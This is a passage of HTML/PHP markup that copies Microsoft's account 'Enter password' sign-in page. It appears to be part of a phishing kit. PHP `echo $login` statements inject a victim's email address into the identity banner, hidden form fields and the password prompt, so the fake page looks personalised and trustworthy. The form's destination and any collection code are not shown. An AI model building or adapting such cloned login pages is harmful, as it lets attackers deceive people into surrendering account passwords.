                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.I) -->
    <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">

        <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.bx,
                displayName: sharedData.displayName || svr.I,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  -->

<div class="identityBanner">
    <!-- ko if: isBackButtonVisible -->
    <button type="button" class="backButton" data-bind="
        attr: { 'id': backButtonId || 'idBtn_Back' },
        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
        ariaDescribedBy: backButtonDescribedBy,
        click: backButton_onClick,
        hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back">
        <!-- ko ifnot: svr.CP -->
            <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="" svgsrc="" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"><!-- /ko -->
<!-- /ko --><!-- /ko -->
        <!-- /ko -->

        <!-- ko if: svr.CP --><!-- /ko -->
    </button>
    <!-- /ko -->

    <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $login ?>"><?php echo $login ?></div>
</div></div>
    </div>
    <!-- /ko -->

    <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.I),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    username: sharedData.username,
                    displayName: sharedData.displayName,
                    hipRequiredForUsername: sharedData.hipRequiredForUsername,
                    passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                    availableCreds: sharedData.availableCreds,
                    evictedCreds: sharedData.evictedCreds,
                    useEvictedCredentials: sharedData.useEvictedCredentials,
                    showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                    flowToken: sharedData.flowToken,
                    defaultKmsiValue: svr.AJ === 1,
                    userTenantBranding: sharedData.userTenantBranding,
                    sessions: sharedData.sessions,
                    callMetadata: sharedData.callMetadata },
                event: {
                    updateFlowToken: $loginPage.view_onUpdateFlowToken,
                    submitReady: $loginPage.view_onSubmitReady,
                    redirect: $loginPage.view_onRedirect,
                    resetPassword: $loginPage.passwordView_onResetPassword,
                    setBackButtonState: view_onSetIdentityBackButtonState,
                    setPendingRequest: $loginPage.view_onSetPendingRequest } }"><!--  -->

<!--  -->

<div aria-hidden="true">
    <input type="hidden" name="email" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
    <input type="hidden" name="email" data-bind="value: unsafe_username" value="<?php echo $login ?>">
    <!-- The loginfmt input type is different as some password managers require it to be of type text.
        Since screen readers might not hide this input, a parent div with aria-hidden true has been added. -->
    <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true" value="<?php echo $login ?>">
    <input type="hidden" name="type" data-bind="value: svr.BY ? 20 : 11" value="11">
    <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
    <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
    <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
    <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
    <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
</div>

<div id="loginHeader" class="row title ext-title" data-bind="externalCss: { 'title': true }">
    <div role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
</div>

<!-- ko if: showCredViewBrandingDesc --><!-- /ko -->

<!-- ko if: unsafe_pageDescription --><!-- /ko -->

<div class="row">
    <div class="form-group col-md-24">
        <div role="alert" aria-live="assertive">
            <!-- ko if: passwordTextbox.error --><!-- /ko -->
        </div>

        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

            <input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
                textInput: passwordTextbox.value,
                ariaDescribedBy: [
                    'loginHeader passwordError',
                    showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
                    unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
                hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
                placeholder: $placeholderText,
                ariaLabel: unsafe_passwordAriaLabel,
                moveOffScreen: showPassword,
                externalCss: {
                    'input': true,
                    'text-box': true,
                    'has-error': passwordTextbox.error }" aria-describedby="loginHeader passwordError  " placeholder="Password" aria-label="Enter the password for <?php echo $login ?>" tabindex="0">

            <!-- ko if: svr.cD && showPassword() --><!-- /ko -->
        <!-- /ko -->
<!-- /ko -->
<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>

        <!-- ko if: svr.cD --><!-- /ko -->
    </div>
</div>

<!-- ko if: shouldHipInit --><!-- /ko -->

<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
    <div>
        <!-- ko if: svr.C2 --><!-- /ko -->
        <!-- ko if: svr.BH !== false && !svr.C2 && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko -->

        <div class="row">
            <div class="col-md-24">
                <div class="text-13">
                    <!-- ko if: svr.aN && svr.aD --><!-- /ko -->
                    <!-- ko ifnot: hideForgotMyPassword -->
                    <div class="form-group">
                        <a id="idA_PWD_ForgotPassword" role="link" href=" " data-bind="
                            text: unsafe_forgotPasswordText,
                            href: accessRecoveryLink || svr.R,
                            attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
                            click: accessRecoveryLink ? null : resetPassword_onClick">Forgot password?</a>
                    </div>
                    <!-- /ko -->
                    <!-- ko if: allowPhoneDisambiguation --><!-- /ko -->
                    <!-- ko ifnot: useEvictedCredentials -->
                        <!-- ko component: { name: "cred-switch-link-control",
                            params: {
                                serverData: svr,
                                username: username,
                                availableCreds: availableCreds,
                                flowToken: flowToken,
                                currentCred: { credType: 1 } },
                            event: {
                                switchView: credSwitchLink_onSwitchView,
                                redirect: onRedirect,
                                setPendingRequest: credSwitchLink_onSetPendingRequest,
                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } --><!--  -->

<div class="form-group">
    <!-- ko if: showSwitchToCredPickerLink --><!-- /ko -->--><!-- /ko -->

    <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) -->
        <!-- ko ifnot: hideCredSwitchLink -->
        <a href="#" data-bind="
            attr: { 'id': switchToCredId },
            text: switchToCredText,
            click: switchToCred_onClick" id="otcLoginLink">Email sent to <?php echo $login ?></a>
        <!-- /ko -->

        <!-- ko if: displayHelp && selectedCredType === 7 --><!-- /ko -->
    <!-- /ko -->

    <!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko -->
</div>

<!-- ko if: credLinkError --><!-- /ko --><!-- /ko -->

                        <!-- ko if: evictedCreds.length > 0 --><!-- /ko -->
                    <!-- /ko -->
                    <!-- ko if: showChangeUserLink --><!-- /ko -->
                </div>
            </div>
        </div>
    </div>

    <div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
        <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
            <div data-bind="component: { name: 'footer-buttons-field',
                params: {
                    serverData: svr,
                    primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
                    isPrimaryButtonEnabled: !isRequestPending(),
                    isPrimaryButtonVisible: svr.e,
                    isSecondaryButtonEnabled: true,
                    isSecondaryButtonVisible: false },
                event: {
                    primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }">

    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block">
        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    'button': true,
                    'primary': true },
                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Continue" data-report-attached="1">
    </div>
</div></div>
        </div>
    </div>
</div>
?>
